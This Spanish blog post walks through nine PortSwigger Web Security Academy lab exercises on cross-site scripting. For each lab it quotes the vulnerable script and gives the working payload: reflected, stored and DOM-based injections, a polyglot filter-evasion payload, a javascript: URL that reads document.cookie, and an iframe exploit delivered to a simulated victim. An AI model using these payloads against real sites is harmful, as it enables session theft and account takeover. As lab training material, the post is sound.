---
layout: post
title: Cross-Side Scripting básico
description: Ejemplos de Cross-Side Scripting básico utilizando los labs de Portswigger.
tags: [ portswigger , XSS , Cross-Side Scripting, write-ups ]
---

# Indice

1. [Introducción](#intro)

2. [Lab #1: Reflected XSS into HTML context with nothing encoded](#lab1)

3. [Lab #2: Stored XSS into HTML context with nothing encoded](#lab2)

4. [Lab #3: DOM XSS in document.write sink using source location.search](#lab3)

5. [Lab #4: DOM XSS in innerHTML sink using source location.search](#lab4)

6. [Lab #5 : DOM XSS in jQuery anchor href attribute sink using location.search source](#lab5)

7. [Lab #6: DOM XSS in jQuery selector sink using a hashchange event](#lab6)

8. [Lab #7: Reflected XSS into attribute with angle brackets HTML-encoded](#lab7)

9. [Lab #8: Stored XSS into anchor href attribute with double quotes HTML-encoded](#lab8)

10. [Lab #9: Reflected XSS into a JavaScript string with angle brackets HTML encoded](#lab9)

11. [Recursos](#recursos)

# Introducción <a id="intro"></a>

El XSS o Cross-Side Scripting es una de las vulnerabilidades más frecuentes hoy en día. En concreto, las inyecciones maliciosas fueron la tercera vulnerabilidad más frecuente en 2021 según [OWASP](https://owasp.org/Top10/). 

Hoy quiero afianzar un poco los conceptos del XSS y para ello voy a hacer algunos de los [Labs de PortSwigger](https://portswigger.net/web-security/all-labs), ya que tienen muchos niveles, son gratuítos y en definitiva son perfectos para iniciarse.


# Lab #1: Reflected XSS into HTML context with nothing encoded<a id="lab1"></a>

El Cross-Side Scripting más sencillo. Basta con escribir en el formulario algo como:
```

<script>alert('1')</script>
```

Y tras lanzar un pop-up con una alerta, habremos completado el ejercicio.




# Lab #2: Stored XSS into HTML context with nothing encoded<a id="lab2"></a>

Un `Stored XSS` es un XSS que se ejecuta desde la base de datos de la página web. Su funcionamiento es diferente a los denominados `Reflected XSS`como el que hemos visto en el ejercicio anterior y que se ejecutan inmediatamente.
Por ejemplo, si un atacante encuentra una vulnerabilidad que le permite almacenar un código malicioso y que será ejecutado por otra persona ( una víctima que visita la página, un administrador, etcétera) estamos antes un Stored XSS.

En la descripción del lab nos avisa de que la vulnerabilidad está en la zona de comentarios del blog. Escribo un comentario cualquiera y lo envío. Cuando vuelvo a la página encuentro que el comentario se ha añadido como un texto normal de la siguiente forma:

```
<p>Mi comentario</p>
```

Así que si cierro el texto anteponiendo `</p>` a mi comentario para cerrar la etiqueta y luego añado el script. En principio quedaría algo como:

```
<p></p><script>mialerta</script></p>
```

Lo intento añadiendo un nuevo comentario como este (y funciona):
```
</p><script>alert('1')</script>
```

# Lab #3: DOM XSS in document.write sink using source location.search<a id="lab3"></a>

Los DOM XSS pueden ocurrir cuando una página contiene javascript que valida o procesa datos desde el lado del cliente. De esa forma, un atacante puede manipular el código e inyectar código malicioso.

Tal es el caso del siguiente reto. En la descripción nos avisan de que la función `document.write` se ejecuta con datos que provienen de `location.search`, es decir desde la URL.

Mirando el código, compruebo que efectivamente, hay un pequeño script que podemos manipular:
```
function trackSearch(query) {
                            document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
                        }
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
    trackSearch(query);
}
```

Si busco “blog” en la página, me responde con una lista de los artículos que tienen la palabra “blog” y además una imagen como esta:

```
<img src=”/resources/images/tracker.gif?searchTerms=blog”>
```

Lo que haré será añadir un parámetro `onload` a la imagen ( al elemento img ), de modo que quede algo como esto:

```
<img src=”/resources/images/tracker.gif?searchTerms=blog” onload=”alerta()” >
```

Para ello he de cerrar las comillas tras la palabra blog, y luego añadir `onload=”alert('1')` (las comillas de después las añadirá la función. Por tanto lo que tengo que escribir en el buscado es:

```
blog" onload="alert('1')
```

# Lab #4: DOM XSS in innerHTML sink using source location.search<a id="lab4"></a>

Parecido al anterior, pero en esta ocasión utiliza un `innerHTML` para añadir contenidos a un “div” según lo que le mandemos ( según lo que encuentre en `location.search`). Un poco enrevesado, pero voy al lab y seguro que queda más claro.

Lo primero que compruebo es que hay otro script que es:
```

function doSearchQuery(query) {
    document.getElementById('searchMessage').innerHTML = query;
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
    doSearchQuery(query);
}
                        
```

Si busco la palabra “blog”, añade al html esto:
                        
```
<span id=”searchMessage”>blog</span>
                        
```

Lo primero que intento es cerrar el `<span>` con otro `</span>` y añadir un script con la alerta. 

```
</span><script>alert('1')</script>
```

Pero no funciona, ya que ignora la etiqueta de cierre. Así que me vengo arriba y añado un [Polygot text XSS Payload](https://twitter.com/garethheyes/status/997466212190781445) que es un script que suele funcionar:

```
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
```

Funciona, pero estoy seguro de que hay otra forma. Así que voy a probar un poco más.

¿Qué ocurriría si añado un `<h1>Hola</h1>`? El DOM añade 

```
<span>
 <h1>Hola</h1>
</span>
```

Así que voy a intentar inyectar una imagen del mismo modo y hacer que salte la alerta cuando se cargue. Busco una imagen cualquiera del blog. Por ejemplo encuentro una que es  
`<img src=”/image/blog/posts/5.jpg”> `. Y añado la función `onload=”alert('1')”` para que se ejecute.

Por alguna razón el script añade algunas comillas extra, así que customizo un poco lo que he de buscar y finalmente hago saltar la alerta con:

```
<img src=/image/blog/posts/5.jpg onload="alert('1')">
```


# Lab #5 : DOM XSS in jQuery anchor href attribute sink using location.search source<a id="lab5"></a>

Aquí encontraremos otra XSS DOM . En esta ocasión está en la página de `submit feedback`. Con jQuery busca un elemento anchor y cambia su atributo "href" con los parámetros que encuentra mediante `location.search`. Importante: hay que ejecutar una alerta en el botón de “back” pero en esta ocasión ha de mostrar `document.cookie`. 

Navego directamente a “Submit Feedback” y veo el script en cuestión

```

$(function() {
    $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
});
                        
```

Básicamente busca el elemento cuya id es “backLink” y añade el parámetro returnPath. Si nos fijamos en la barra de navegación, hay un parámetro "returnPath":

```
https://….web-security-academy.net/feedback?returnPath=/
```

No todos los XSS empiezan por <script>y acaban por </script>. También podemos inyectar con `javascript:alert() ` tal y como explican [aquí](https://security.stackexchange.com/questions/211715/java-script-in-link-href-javascriptalert1) . Por tanto, solución:

```
https://….web-security-academy.net/feedback?returnPath=javascript:alert(document.cookie)
```


# Lab #6: DOM XSS in jQuery selector sink using a hashchange event<a id="lab6"></a>

En este caso se trata de otra vulnerabilidad DOM XSS en la que el fallo está en un selector jQuery que sirve a la página para hacer un auto-scroll mediante la propiedad `location.hash`. Para resolver el reto, hay que crear un exploit que enviaremos de manera ficticia a un usuario que a su vez llamará a la función `print()`.

El código en cuestión es

```

$(window).on('hashchange', function(){
    var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
    if (post) post.get(0).scrollIntoView();
});
                    
```

Podemos ver que funciona si añadimos a la url en nuestro navegador algo como “#Finding” (que hará scroll al post cuyo título tiene la palabra “Finding”). Pero el problema que tenemos ahora es que tenemos que hacer que el evento `hashchange` se ejecute de forma remota. Y podemos hacerlo de la siguiente forma:

```
<iframe src="https://webvulnerable.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
```

Es decir, creamos un src que apunta a una página con un “#” vacío. Y cuando se intenta abrir, falla y ejecuta a su vez nuestra alerta. Tan sólo hay que cambiar la función alert(1) por print() y estaría listo. Hay que ir a `Go to exploit server`y en  el apartado de “Body” escribir:

```
<iframe src="https://….web-security-academy.net/#" onload="this.src+='<img src=1 onerror=alert()>'">
```

Podemos ver el exploit si vamos a “View Exploit”. Una vez que compruebo que funciona, reemplazo “alert()” por “print()” y le doy a “Deliver exploit to victim”. 

Después accedo a los logs y reto superado. 

# Lab #7: Reflected XSS into attribute with angle brackets HTML-encoded<a id="lab7"></a>

De nuevo hay una vulnerabilidad en el formulario que hace de buscador en el blog. Tenemos que ejecutar la función `alert()` para resolverlo.

Intento buscar algo al azar (asdasij) y en el código veo que a búsqueda aparece así en el código:

```
<h1>“0 search results from ‘asdasij’ </h1>
```

Intento escapar el `<h1>`:

```
</h1><script>alert(1)</script>
```

Pero no funciona ya que no reconoce los símbolos “<” ni “>”. Así que la solución es parecida a lo que veníamos haciendo, añadir un evento “onmouseover” a nuestro h1 añadiento comillas sólo al principio de la función alert() , ya que las otras serán añadidas por el script.

```
“ onmouseover=”alert(1)
```

# Lab #8: Stored XSS into anchor href attribute with double quotes HTML-encoded<a id="lab8"></a>

Otro reto parecido al anterior donde el tipo de Cross-Site Scripting es `stored`, de manera que se ha de ejecutar una alerta cuando pinchamos en el nombre del autor de un comentario. En principio es parecido al [Lab #2](#lab2) . 

Añado un comentario al azar y veo si añadimos un sitio en el aparatado de “Website”, enlaza el nombre del autor con su website añadiendo una etiqueta `<a>`.

Por tanto en el campo "Website" tan sólo he de añadir un parámetro `onmouseover` y jugar con las comillas para que el HTML tenga sentido y sea interpretado correctamente:

```
hello" onmouseover="javascript:alert(1)
```

# Lab #9: Reflected XSS into a JavaScript string with angle brackets HTML encoded<a id="lab9"></a>

En esta ocasión los “<” y “>” estarán codificados. Tenemos que ser capaces de romper ese filtro para poder ejecutar una alerta. 

Empiezo buscando algo como 'me’ y compruebo que efectivamente hay un script que añade una imagen y tiene como fuente la búsqueda que haga pero codificada:

```
var searchTerms = 'me';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
```
     
Lo cual nos dificulta el utilizar comillas ya que las codificará. Por tanto la imagen que queremos “trucar” para que ejecute la alerta con el parámetro “onerror=alert(1)” o algo similar, quedará como “%22%20onerror%3D%22alert(1)"” .

[Aquí](https://www.the-art-of-web.com/javascript/escape/) se ven los valores que son y los que no son codificados. Y [aquí](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Cross%20Site%20Scripting.md) algunos parámetros que podemos intentar inyectar. 

En concreto, como vamos a inyectar en un script, dentro de un string podemos intentar [esto en concreto](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Cross%20Site%20Scripting.md#xss-cheat-sheet-advanced)

```
'-alert(1)-'

// o también sirve:

'/alert(1)//

```

# Recursos<a id="recursos"></a>


- https://portswigger.net/web-security/cross-site-scripting
- https://ironhackers.es/cheatsheet/cross-site-scripting-xss-cheat-sheet/
- https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
- https://portswigger.net/web-security/cross-site-scripting/dom-based
- https://paper.bobylive.com/Security/XSS_Cheat_Sheet_2018_Edition.pdf
- https://github.com/daffainfo/AllAboutBugBounty/blob/master/Cross%20Site%20Scripting.md




